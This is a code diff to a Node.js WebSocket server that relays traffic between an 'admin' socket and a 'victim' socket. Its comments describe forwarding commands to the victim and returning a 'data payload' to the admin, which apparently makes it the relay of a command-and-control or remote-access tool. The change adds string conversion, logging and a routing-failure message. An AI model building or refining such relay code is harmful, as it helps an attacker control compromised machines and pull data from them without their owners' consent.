@@ -26,12 +26,19 @@ wss.on('connection', (ws, req) => {
     }
 
     ws.on('message', (message) => {
-        if (ws === adminSocket && victimSocket && victimSocket.readyState === ws.OPEN) {
-            victimSocket.send(message);
-        } else if (ws === victimSocket && adminSocket && adminSocket.readyState === ws.OPEN) {
-            adminSocket.send(message);
-        }
-    });
+    const messageStr = message.toString();
+    console.log(`Received message: ${messageStr}`);
+
+    if (ws === adminSocket && victimSocket && victimSocket.readyState === WebSocket.OPEN) {
+        // Forward command from Admin to Victim
+        victimSocket.send(messageStr);
+    } else if (ws === victimSocket && adminSocket && adminSocket.readyState === WebSocket.OPEN) {
+        // Forward data payload back from Victim to Admin
+        adminSocket.send(messageStr);
+    } else {
+        console.log("Routing failed: Either recipient is disconnected or not ready.");
+    }
+});
 
     ws.on('close', () => {
         if (ws === victimSocket) {
